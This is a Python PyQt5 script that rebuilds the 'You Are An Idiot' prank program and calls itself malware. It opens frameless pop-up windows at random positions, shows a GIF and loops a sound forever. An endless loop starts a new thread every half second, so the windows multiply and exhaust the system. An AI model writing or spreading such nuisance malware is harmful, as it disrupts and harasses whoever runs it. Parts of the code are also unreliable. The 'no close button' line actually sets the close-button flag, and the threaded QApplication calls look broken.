import random
import sys
import time
import threading
# import Event
from PyQt5.QtCore import QEvent
from PyQt5.QtMultimedia import QSound
# import QtThreads
from PyQt5.QtCore import (QObject, QThread, pyqtSignal, pyqtSlot, QTimer,)
# import QtCore
from PyQt5 import QtCore
from PyQt5.QtWidgets import (QApplication, QWidget,QMainWindow,QVBoxLayout,QPushButton,)
# import imageTk
# from PIL import ImageTk, Image
# import label
from PyQt5.QtWidgets import QLabel
from PyQt5.QtGui import QMovie

# Create a subclass of QMainWindow to setup the malware
class YouAreAnIdoit(QMainWindow):
    """ Let's gooooooooooooooooooooooooooooo 🥁"""
    def __init__(self):
        """View initializer"""
        super().__init__()
        # Set some main window's properties
        # no title bar
        self.setWindowFlags(QtCore.Qt.FramelessWindowHint)
        # window on random position
        x= random.randint(0,999)
        y= random.randint(0,999)
        self.setGeometry(x,y,235,172)

        self.setFixedSize(234, 171)
        # Set the central widget
        # self._centralWidget = QWidget(self)
        # self.setCentralWidget(self._centralWidget)
        # no close button on the window
        self.setWindowFlags(QtCore.Qt.WindowCloseButtonHint)

        # show a gif using pyqt5
        # Set gif content to be same size as window (600px / 400px)
        self.MovieLabel = QLabel(self)
        self.MovieLabel.setGeometry(QtCore.QRect(0,0, 234, 171))
        self.movie = QMovie('idiot2.gif')
        self.MovieLabel.setMovie(self.movie)
        self.movie.start()

        # play a sound file
        # QSound.play('idiot.mp3')
        self.sound = QSound("idiot.wav")
        # loop forever
        self.sound.setLoops(-1)
        self.sound.play()


        


        
def main():
    """Main function."""
    # Create an instance of QApplication
    youareanidoit = QApplication(sys.argv)
    # Show the malware
    view = YouAreAnIdoit()
    view.show()
    # view.runLongTask()
    
    # Execute the malwares main loop
    sys.exit(youareanidoit.exec_())

   

if __name__ == '__main__':
    # main()
    while True:
        print('runnin')
        thread = threading.Thread(target=main)
        time.sleep(0.5)
        thread.start()
        # time.sleep(1)

        
        